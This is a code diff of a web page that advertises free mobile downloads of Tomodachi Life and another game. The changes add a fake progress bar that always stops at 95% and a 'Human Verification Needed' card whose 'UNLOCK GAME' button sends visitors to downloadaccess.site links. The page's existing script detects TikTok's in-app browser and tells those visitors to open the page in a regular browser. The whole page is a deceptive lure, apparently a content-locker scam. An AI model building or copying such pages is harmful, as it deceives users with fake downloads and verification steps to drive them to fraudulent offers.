@@ -21,7 +21,7 @@
         }
     </script>
 
-    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;600;700;900&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;600;700;900&display=swap" rel="stylesheet">
 
     <style>
         * {
@@ -350,6 +350,58 @@
             }
         }
 
+        @keyframes dotBlink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.15;
+            }
+        }
+
+        @keyframes shieldDrop {
+            0% {
+                transform: scale(0.5) translateY(-20px);
+                opacity: 0;
+            }
+
+            70% {
+                transform: scale(1.1) translateY(3px);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+
+            60%,
+            100% {
+                left: 160%;
+            }
+        }
+
+        @keyframes borderPulse {
+
+            0%,
+            100% {
+                border-color: rgba(242, 118, 33, 0.25);
+            }
+
+            50% {
+                border-color: rgba(242, 118, 33, 0.65);
+            }
+        }
+
         #popup-overlay {
             position: fixed;
             top: 0;
@@ -544,7 +596,7 @@
             gap: 7px;
             transition: background 0.2s ease, border-color 0.2s ease, transform 0.18s ease, box-shadow 0.2s ease;
             color: #aaa;
-            font-family: 'Exo 2', sans-serif;
+            font-family: 'Lexend', sans-serif;
             font-size: 10.5px;
             font-weight: 600;
             letter-spacing: 0.03em;
@@ -567,6 +619,223 @@
             width: 28px;
             height: 28px;
             flex-shrink: 0;
+        }
+
+        #verify-section {
+            animation: fadeSlideUp 0.4s ease both;
+        }
+
+        .verify-card {
+            border: 1px solid rgba(242, 118, 33, 0.3);
+            border-radius: 12px;
+            padding: 20px 16px 18px;
+            background: linear-gradient(160deg, rgba(245, 173, 30, 0.07) 0%, rgba(242, 118, 33, 0.04) 100%);
+            animation: borderPulse 2.5s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verify-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 10%;
+            right: 10%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #F5AD1E, #F27621, transparent);
+        }
+
+        .verify-shield-wrap {
+            margin-bottom: 14px;
+        }
+
+        .verify-shield {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, #F5AD1E, #F27621);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            animation: shieldDrop 0.5s cubic-bezier(.36, 1.4, .5, 1) both;
+            box-shadow: 0 0 0 8px rgba(245, 173, 30, 0.1), 0 0 24px rgba(242, 118, 33, 0.4);
+        }
+
+        .verify-shield svg {
+            width: 26px;
+            height: 26px;
+            fill: #fff;
+        }
+
+        .verify-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(255, 55, 55, 0.1);
+            border: 1px solid rgba(255, 80, 80, 0.3);
+            border-radius: 99px;
+            padding: 4px 11px;
+            font-family: 'Lexend', sans-serif;
+            font-size: 10px;
+            font-weight: 700;
+            color: #ff6b6b;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            margin: 0 auto 12px;
+        }
+
+        .verify-badge .dot {
+            width: 5px;
+            height: 5px;
+            background: #ff4c4c;
+            border-radius: 50%;
+            animation: dotBlink 1s ease infinite;
+            flex-shrink: 0;
+        }
+
+        .verify-headline {
+            font-family: 'Lexend', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+            line-height: 1.35;
+        }
+
+        .verify-sub {
+            font-family: 'Lexend', sans-serif;
+            font-size: 12.5px;
+            color: #888;
+            line-height: 1.6;
+            margin-bottom: 18px;
+        }
+
+        .verify-sub strong {
+            color: #F5AD1E;
+            font-weight: 600;
+        }
+
+        .verify-steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            margin-bottom: 18px;
+        }
+
+        .vstep {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            font-family: 'Lexend', sans-serif;
+            font-size: 9.5px;
+            color: #555;
+            min-width: 48px;
+        }
+
+        .vstep-dot {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            border: 1.5px solid #2a2a2a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: #444;
+        }
+
+        .vstep.done .vstep-dot {
+            background: linear-gradient(135deg, #F5AD1E, #F27621);
+            border-color: transparent;
+            color: #fff;
+            font-size: 12px;
+        }
+
+        .vstep.active .vstep-dot {
+            border-color: #F5AD1E;
+            color: #F5AD1E;
+            box-shadow: 0 0 10px rgba(245, 173, 30, 0.4);
+        }
+
+        .vstep.done {
+            color: #aaa;
+        }
+
+        .vstep.active {
+            color: #F5AD1E;
+        }
+
+        .vstep-line {
+            width: 20px;
+            height: 1.5px;
+            background: #222;
+            margin-bottom: 20px;
+            flex-shrink: 0;
+        }
+
+        .vstep-line.done {
+            background: linear-gradient(90deg, #F5AD1E, #F27621);
+        }
+
+        #verify-btn {
+            font-family: 'Lexend', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 9px;
+            width: 100%;
+            padding: 14px 20px;
+            background: linear-gradient(135deg, #F5AD1E 0%, #F27621 100%);
+            color: #fff;
+            font-size: 12.5px;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            border-radius: 10px;
+            border: none;
+            text-decoration: none;
+            cursor: pointer;
+            animation: btnPulse 2s ease-in-out infinite;
+            -webkit-tap-highlight-color: transparent;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #verify-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 55%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shimmer 2.5s ease infinite;
+        }
+
+        #verify-btn svg {
+            width: 15px;
+            height: 15px;
+            fill: #fff;
+            flex-shrink: 0;
+        }
+
+        .verify-trust {
+            margin-top: 11px;
+            font-family: 'Lexend', sans-serif;
+            font-size: 10px;
+            color: #444;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .verify-trust svg {
+            width: 10px;
+            height: 10px;
+            fill: #444;
         }
     </style>
 </head>
@@ -616,8 +885,7 @@
                 <div class="game-info">
                     <h2>Tomodachi Life Mobile</h2>
                     <p>Tomodachi Life Living The Dream lets you create unique characters and watch their lives unfold on
-                        your
-                        island.</p>
+                        your island.</p>
                     <div class="tags">
                         <span class="tag">iOS & Android</span>
                         <span class="tag">Free Download</span>
@@ -639,25 +907,23 @@
     </footer>
 
     <div id="tiktok-fallback" style="
-                display: none;  
-                position: fixed;
-                top: 0; left: 0;  
-                width: 100vw; height: 100vh;
-                background: #000000;
-                z-index: 9999;
-                flex-direction: column;
-                align-items: center;
-                justify-content: flex-start;
-                text-align: center;
-                padding: 20px;
-                padding-top: 50px;
-                box-sizing: border-box;">
-
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        background: #000000;
+        z-index: 9999;
+        flex-direction: column;
+        align-items: center;
+        justify-content: flex-start;
+        text-align: center;
+        padding: 20px;
+        padding-top: 50px;
+        box-sizing: border-box;">
         <img src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="Instruction GIF"
             style="max-width: 100%; height: auto; max-height: 70vh; margin-bottom: 15px; border-radius: 8px;" />
-
         <p style="font-family: sans-serif; font-size: 18px; color: #ffffff; margin: 0;">
-            🚀​ For a protection and safety, please <b>Open in Browser</b>.
+            🚀 For a protection and safety, please <b>Open in Browser</b>.
         </p>
     </div>
 
@@ -667,7 +933,6 @@
             <div id="device-phase" style="display:none;">
                 <div class="device-icon-wrap">
                     <div class="device-icon-ring">
-
                         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
                             style="width:22px;height:22px;fill:#F5AD1E;">
                             <path d="M19 9h-4V3H9v6H5l7 7 7-7zm-8 2V5h2v6h1.17L12 13.17 9.83 11H11zm-6 7h14v2H5v-2z" />
@@ -677,7 +942,6 @@
                 <p class="device-select-title">Choose Your Device</p>
                 <p class="device-select-sub">Select your platform to start the download</p>
                 <div class="device-options">
-
                     <button class="device-btn" onclick="selectDevice('android')">
                         <svg class="device-os-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                             <path fill="#3DDC84"
@@ -685,7 +949,6 @@
                         </svg>
                         Android
                     </button>
-
                     <button class="device-btn" onclick="selectDevice('ios')">
                         <svg class="device-os-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                             <path fill="#A2AAAD"
@@ -693,11 +956,10 @@
                         </svg>
                         iOS
                     </button>
-
                 </div>
             </div>
 
-            <div id="loading-phase">
+            <div id="loading-phase" style="display:none;">
                 <div class="popup-icon-wrap">
                     <div class="popup-spinner">
                         <div class="popup-spinner-inner">
@@ -716,129 +978,198 @@
                 <span id="progress-text">0%</span>
             </div>
 
+            <div id="verify-section" style="display:none;">
+                <div class="verify-card">
+
+                    <div class="verify-shield-wrap">
+                        <div class="verify-shield">
+                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.35C17.25 21.15 21 16.25 21 11V5L12 1zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z" />
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="verify-badge">
+                        <span class="dot"></span> Action Required
+                    </div>
+
+                    <p class="verify-headline">Human Verification Needed</p>
+
+                    <p class="verify-sub">
+                        Your download is <strong>95% complete</strong><br>One quick
+                        verification unlocks your game instantly.
+                    </p>
+
+                    <div class="verify-steps">
+                        <div class="vstep done">
+                            <div class="vstep-dot">✓</div>
+                            <span>Connect</span>
+                        </div>
+                        <div class="vstep-line done"></div>
+                        <div class="vstep done">
+                            <div class="vstep-dot">✓</div>
+                            <span>Download</span>
+                        </div>
+                        <div class="vstep-line done"></div>
+                        <div class="vstep active">
+                            <div class="vstep-dot">!</div>
+                            <span>Verify</span>
+                        </div>
+                        <div class="vstep-line"></div>
+                        <div class="vstep">
+                            <div class="vstep-dot">▶</div>
+                            <span>Play</span>
+                        </div>
+                    </div>
+
+                    <button id="verify-btn">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                        </svg>
+                        UNLOCK GAME
+                    </button>
+
+                    <div class="verify-trust">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.35C17.25 21.15 21 16.25 21 11V5L12 1z" />
+                        </svg>
+                        Free &amp; secure · Takes less than 30 seconds
+                    </div>
+
+                </div>
+            </div>
+
         </div>
+    </div>
 
-        <script>
-            let _pendingUrls = { android: '#', ios: '#' };
+    <script>
+        let _pendingUrls = { android: '#', ios: '#' };
 
-            const DOWNLOAD_LINKS = {
-                tomodachi: {
-                    android: "https://downloadaccess.site/cl/v/o4er7n",
-                    ios: "https://downloadaccess.site/cl/v/o4er7n",
-                },
-
-                meccha: {
-                    android: "https://downloadaccess.site/cl/i/o4e2md",
-                    ios: "https://downloadaccess.site/cl/i/o4e2md",
-                }
-            };
-
-            function startDownload(gameId) {
-                const links = DOWNLOAD_LINKS[gameId];
-
-                _pendingUrls = links;
-
-                const popup = document.getElementById('popup-overlay');
-                const devicePhase = document.getElementById('device-phase');
-                const loadPhase = document.getElementById('loading-phase');
-                const verify = document.getElementById('verify-section');
-
-                popup.style.display = 'flex';
-                document.body.style.overflow = 'hidden';
-
-                devicePhase.style.display = 'block';
-                loadPhase.style.display = 'none';
-                verify.style.display = 'none';
+        const DOWNLOAD_LINKS = {
+            tomodachi: {
+                android: "https://downloadaccess.site/cl/v/o4er7n",
+                ios: "https://downloadaccess.site/cl/v/o4er7n",
+            },
+            meccha: {
+                android: "https://downloadaccess.site/cl/i/o4e2md",
+                ios: "https://downloadaccess.site/cl/i/o4e2md",
             }
+        };
 
-            function selectDevice(device) {
-                const devicePhase = document.getElementById('device-phase');
-                const loadPhase = document.getElementById('loading-phase');
+        function startDownload(gameId) {
+            const links = DOWNLOAD_LINKS[gameId];
+            _pendingUrls = links;
 
-                const step = document.getElementById('step-text');
-                const bar = document.getElementById('progress-bar');
-                const txt = document.getElementById('progress-text');
-                const title = document.getElementById('popup-title');
+            const popup = document.getElementById('popup-overlay');
+            const devicePhase = document.getElementById('device-phase');
+            const loadPhase = document.getElementById('loading-phase');
+            const verify = document.getElementById('verify-section');
 
-                const url = _pendingUrls[device] || '#';
+            popup.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
 
-                devicePhase.style.display = 'none';
-                loadPhase.style.display = 'block';
+            devicePhase.style.display = 'block';
+            loadPhase.style.display = 'none';
+            verify.style.display = 'none';
+        }
 
-                bar.style.width = '0%';
-                txt.textContent = '0%';
-                step.textContent = 'Initializing... 0%';
-                title.textContent = 'Preparing your game...';
+        function selectDevice(device) {
+            const devicePhase = document.getElementById('device-phase');
+            const loadPhase = document.getElementById('loading-phase');
+            const verify = document.getElementById('verify-section');
 
-                const steps = [22, 53, 78, 95];
-                const msgs = [
-                    'Connecting to servers...',
-                    'Downloading assets...',
-                    'Installing game files...',
-                    'Finalizing...'
-                ];
+            const step = document.getElementById('step-text');
+            const bar = document.getElementById('progress-bar');
+            const txt = document.getElementById('progress-text');
+            const title = document.getElementById('popup-title');
 
-                let i = 0;
+            const url = _pendingUrls[device] || '#';
 
-                const interval = setInterval(() => {
-                    bar.style.width = steps[i] + '%';
-                    txt.textContent = steps[i] + '%';
-                    step.textContent = msgs[i] + ' ' + steps[i] + '%';
+            devicePhase.style.display = 'none';
+            loadPhase.style.display = 'block';
+            verify.style.display = 'none';
 
-                    i++;
+            bar.style.width = '0%';
+            txt.textContent = '0%';
+            step.textContent = 'Initializing... 0%';
+            title.textContent = 'Preparing your game...';
 
-                    if (i === steps.length) {
-                        clearInterval(interval);
+            const steps = [22, 53, 78, 95];
+            const msgs = [
+                'Connecting to servers...',
+                'Downloading assets...',
+                'Installing game files...',
+                'Finalizing...'
+            ];
 
-                        setTimeout(() => {
+            let i = 0;
+
+            const interval = setInterval(() => {
+                bar.style.width = steps[i] + '%';
+                txt.textContent = steps[i] + '%';
+                step.textContent = msgs[i] + ' ' + steps[i] + '%';
+                i++;
+
+                if (i === steps.length) {
+                    clearInterval(interval);
+
+                    setTimeout(() => {
+                        loadPhase.style.display = 'none';
+                        verify.style.display = 'block';
+
+                        document.getElementById('verify-btn').onclick = function (e) {
+                            e.preventDefault();
                             window.location.href = url;
-                        }, 3000);
-                    }
-                }, 2000);
+                        };
+                    }, 3000);
+                }
+            }, 2000);
+        }
+    </script>
+
+    <script>
+        (function () {
+            const ua = navigator.userAgent.toLowerCase();
+            const ref = document.referrer.toLowerCase();
+            const fb = document.getElementById('tiktok-fallback');
+            if (!fb) return;
+
+            const tikTokIdentifiers = [
+                "tiktok",
+                "musical_ly",
+                "com.ss.android.ugc.trill",
+                "musicallygo"
+            ];
+
+            const isTikTokBrowser = tikTokIdentifiers.some(id => ua.includes(id)) || ref.includes("tiktok");
+
+            if (isTikTokBrowser) {
+                fb.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+            } else {
+                fb.style.display = 'none';
+                document.body.style.overflow = 'auto';
             }
-        </script>
+        })();
+    </script>
 
-        <script>
-            (function () {
-                const ua = navigator.userAgent.toLowerCase();
-                const ref = document.referrer.toLowerCase();
-                const fb = document.getElementById('tiktok-fallback');
-                if (!fb) return;
+    <script>
+        const searchBar = document.getElementById("searchBar");
 
-                const tikTokIdentifiers = [
-                    "tiktok",
-                    "musical_ly",
-                    "com.ss.android.ugc.trill",
-                    "musicallygo"
-                ];
+        searchBar.addEventListener("input", function () {
+            const query = searchBar.value.toLowerCase();
+            const headings = document.querySelectorAll("h1, h2");
 
-                const isTikTokBrowser = tikTokIdentifiers.some(id => ua.includes(id)) || ref.includes("tiktok");
-
-                if (isTikTokBrowser) {
-                    fb.style.display = 'flex';
-                    document.body.style.overflow = 'hidden';
-                } else {
-                    fb.style.display = 'none';
-                    document.body.style.overflow = 'auto';
+            for (let h of headings) {
+                if (query !== "" && h.textContent.toLowerCase().startsWith(query)) {
+                    h.scrollIntoView({ behavior: "smooth", block: "center" });
+                    break;
                 }
-            })();
-        </script>
-
-        <script>
-            const searchBar = document.getElementById("searchBar");
-
-            searchBar.addEventListener("input", function () {
-                const query = searchBar.value.toLowerCase();
-                const headings = document.querySelectorAll("h1, h2");
-
-                for (let h of headings) {
-                    if (query !== "" && h.textContent.toLowerCase().startsWith(query)) {
-                        h.scrollIntoView({ behavior: "smooth", block: "center" });
-                        break;
-                    }
-                }
-            });
-        </script>
+            }
+        });
+    </script>
 
 </body>
 
